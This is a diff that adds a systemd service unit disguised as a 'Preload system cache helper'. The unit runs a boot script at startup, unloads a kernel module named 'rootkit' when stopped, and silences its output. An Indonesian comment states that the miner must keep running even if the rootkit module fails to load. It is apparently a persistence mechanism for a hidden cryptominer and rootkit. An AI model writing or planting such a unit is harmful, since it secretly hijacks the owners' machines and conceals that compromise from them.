@@ -1,0 +1,18 @@
+[Unit]
+Description=Preload system cache helper
+DefaultDependencies=no
+After=network.target
+Before=syscached.service
+# Wants= bukan Requires=: miner harus tetap jalan walau modul gagal dimuat
+# (mis. kernel baru tanpa header build).
+Wants=syscached.service
+
+[Service]
+Type=oneshot
+RemainAfterExit=yes
+ExecStart=/opt/sysconf/rk-boot.sh
+ExecStop=/sbin/rmmod rootkit
+StandardOutput=null
+
+[Install]
+WantedBy=multi-user.target
